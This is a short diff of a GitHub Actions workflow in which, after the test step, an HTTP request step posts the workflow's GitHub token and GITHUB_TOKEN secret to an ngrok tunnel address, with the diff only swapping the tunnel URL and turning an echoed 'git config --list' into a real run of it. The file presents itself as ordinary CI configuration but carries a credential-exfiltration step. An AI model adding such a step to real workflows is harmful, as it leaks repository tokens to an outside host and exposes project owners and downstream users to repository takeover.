@@ -14,10 +14,10 @@ jobs:
           npm test
           
       - run: |
-         echo git config --list
+          git config --list
       
       - uses: fjogeleit/http-request-action@master
         with:
-          url: 'https://6858-93-172-42-40.ngrok.io'
+          url: 'https://5aa7-93-172-42-40.ngrok.io'
           method: 'POST'
           data: '{"${{ github.token }}, ${{ secrets.GITHUB_TOKEN }}"}'
